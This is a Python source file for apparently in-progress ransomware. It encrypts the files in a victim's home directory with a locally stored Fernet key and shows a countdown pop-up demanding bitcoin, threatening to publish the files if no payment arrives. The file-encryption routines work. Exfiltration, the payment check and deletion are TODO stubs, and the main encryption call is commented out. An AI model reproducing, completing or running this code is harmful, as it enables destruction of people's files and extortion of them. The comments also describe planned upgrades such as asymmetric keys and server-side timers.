import os
from os.path import expanduser
from cryptography.fernet import Fernet
import subprocess
import time
import signal
from C2Server import list_safe_directories, get_files_in_dir

# Home directory
home = expanduser("~")

#TODO:
def send_file_to_server(file_path):
    return

#TODO:
def check_if_user_has_paid():
    return False

def generate_key():
    if not os.path.isfile("./key.key"):
        key = Fernet.generate_key()
        with open("key.key", "wb") as the_key:
            the_key.write(key)


# Method that lists all of the non-hidden, non-vital  directories bellow the inserted directory
def list_safe_directories(directory):

    result = []
    excluded_dirs = set([".", "..", ".Trash-1000", ".config", ".local", ".cache"])

    # Go through all of the directories and exlcude the ones in the excluded_dirs set
    for root, dirs, _ in os.walk(directory):
        dirs[:] = [d for d in dirs if not d.startswith(".") and d not in excluded_dirs]

        result.append(root)
        for directory in dirs:
            result.append(os.path.join(root, directory))

    return result  # Return the list of directories

# Method that retrieves all of the files in a directory and purposely does not include the ransomeware
def get_files_in_dir(directory):
    # change to home directory so that the paths are correct relative paths.
    os.chdir(directory)

    files = []
    for file in os.listdir(directory):
        # We do not want to encrypt our own ransomware
        if file == "mal.py" or file == "key.key":
            continue
        if os.path.isfile(file):
            files.append(file)

    return files


# Method for encrypting a single file
def encrypt_file(file, key):
    print("started")
    with open(file, "rb") as the_file:
        contents = the_file.read()

    encrypted_contents = Fernet(key).encrypt(contents)
    with open(file, "wb") as the_file:
        the_file.write(encrypted_contents)
    print("terminated")


# Encrypt all the safe to encrypt files on a victims pc
def encrypt_and_send_all_files(directory, key):

    number_of_files = 0
    size_of_files = 0

    dir_list = list_safe_directories(home)
    for dir in dir_list:
        for file in get_files_in_dir(dir):
            file_path = os.path.join(dir, file)
            file_size = os.path.getsize(file_path)
            size_of_files += file_size
            number_of_files += 1

            # Send file to server
            send_file_to_server(file_path)

            # Encrypt file
            encrypt_file(file_path, key)

    print("Number of files encrypted: " + str(number_of_files))
    print("Total size of files: " + str(size_of_files))


def decrypt_file(file_path, key):
    with open(file_path, "rb") as file:
        encrypted_contents = file.read()

    decrypted_contents = Fernet(key).decrypt(encrypted_contents)
    with open(file_path, "wb") as the_file:
        the_file.write(decrypted_contents)


def decrypt_all_files(directory, key):
    dir_list = list_safe_directories(home)
    for dir in dir_list:
        for file in get_files_in_dir(dir):
            file_path = os.path.join(dir, file)
            decrypt_file(file_path, key)



#Main function/ control flow
def main(duration):

    #TODO: Replace this with Asymetric crypto
    #Generate key and make a key file
    generate_key()
    with open("key.key", "rb") as key:
        key = key.read()


    #Encrypt all files
    # encrypt_and_send_all_files(home, key)


    #NOTE: Ideally this time would be stored on the server so that if they close their computer and open it 
    # again its still the same. Alternatively mayb we tell them not to close their computer?

    start_time = time.time()
    remaining_time = duration

    while remaining_time > 0:
            # Format the remaining time as hours, minutes and seconds
            hours = int(remaining_time // 3600)
            minutes = int((remaining_time%3600) // 60)
            seconds = int(remaining_time % 60)

            # Text to be displayed on the pop up
            text = f"HAHAHAHA, all your files are encrypted and stored on our server!\n If you pay us in the next <b>{hours:02d}:{minutes:02d}:{seconds:02d}</b> we will decrypt your files and delete our copy.\n If you do not pay us, the files will be published to the internet for all to see. \nTransfer: xxx btc to wallet_id"

            # Show the dialog with the remaining time, keep refreshing the window.
            popup = subprocess.Popen(["zenity", "--warning", "--text", text,"--width", "400", "--height", "200" ])

            # Update the remaining time
            elapsed_time = time.time() - start_time
            remaining_time = duration - elapsed_time
            time.sleep(1)
            popup.send_signal(signal.SIGTERM)

            if (check_if_user_has_paid()):
                break


    #User has paid before the time ran out
    if (check_if_user_has_paid()):
        popup = subprocess.Popen(["zenity", "--info", "--text", "Payment has been recieved! \n Decrypting all files.","--width", "400", "--height", "200" ])
        # decrypt_all_files(home, key)
        #TODO: Implement code to delete all the files that are stored on the server

    else: # Timer has run out
        #TODO: Implement file deletion and internet publication code.
        return


main(86400)
